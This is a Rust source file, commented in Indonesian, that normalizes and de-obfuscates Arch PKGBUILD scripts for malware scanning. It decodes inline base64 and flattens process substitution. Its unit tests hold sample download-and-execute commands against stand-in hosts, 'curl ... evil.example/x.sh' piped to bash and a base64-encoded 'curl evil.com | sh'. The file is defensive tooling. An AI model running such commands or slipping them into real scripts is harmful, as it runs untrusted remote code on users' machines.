use base64::prelude::*;
use regex::Regex;

#[derive(Debug, Clone)]
pub struct NormalizedBuffer {
    pub original: String,
    pub normalized: String,
    pub decoded_payloads: Vec<String>,
}

pub struct ScriptNormalizer;

impl ScriptNormalizer {
    /// Melakukan normalisasi dan de-obfuscation awal pada skrip PKGBUILD
    pub fn normalize(content: &str) -> NormalizedBuffer {
        let mut normalized = content.to_string();
        let mut decoded_payloads = Vec::new();

        // 1. Deteksi dan auto-decode Base64 inline
        // Contoh: echo "BASE64" | base64 -d
        let b64_regex = Regex::new(r#"echo\s+["']([A-Za-z0-9+/=]{8,})["']\s*\|\s*base64\s+-d"#).unwrap();
        for cap in b64_regex.captures_iter(content) {
            if let Some(b64_str) = cap.get(1) {
                if let Ok(decoded_bytes) = BASE64_STANDARD.decode(b64_str.as_str()) {
                    if let Ok(decoded_text) = String::from_utf8(decoded_bytes) {
                        decoded_payloads.push(decoded_text.clone());
                        normalized.push_str(&format!("\n# [DECODED_INLINE_PAYLOAD]\n{}", decoded_text));
                    }
                }
            }
        }

        // 2. Syntax Flattening: Process Substitution ke Pipe standar
        // Mengubah `bash < <(curl ...)` menjadi `curl ... | bash`
        let proc_sub_regex = Regex::new(r#"(?:ba)?sh\s+<\s*<\((curl[^)]+)\)"#).unwrap();
        normalized = proc_sub_regex.replace_all(&normalized, "$1 | bash").to_string();

        NormalizedBuffer {
            original: content.to_string(),
            normalized,
            decoded_payloads,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_process_substitution_flattening() {
        let input = "bash < <(curl -fsSL https://evil.example/x.sh)";
        let result = ScriptNormalizer::normalize(input);
        assert!(result.normalized.contains("curl -fsSL https://evil.example/x.sh | bash"));
    }

    #[test]
    fn test_base64_decoding_extraction() {
        let input = r#"echo "Y3VybCBldmlsLmNvbSB8IHNo" | base64 -d | sh"#;
        let result = ScriptNormalizer::normalize(input);
        assert!(result.normalized.contains("curl evil.com | sh"));
    }
}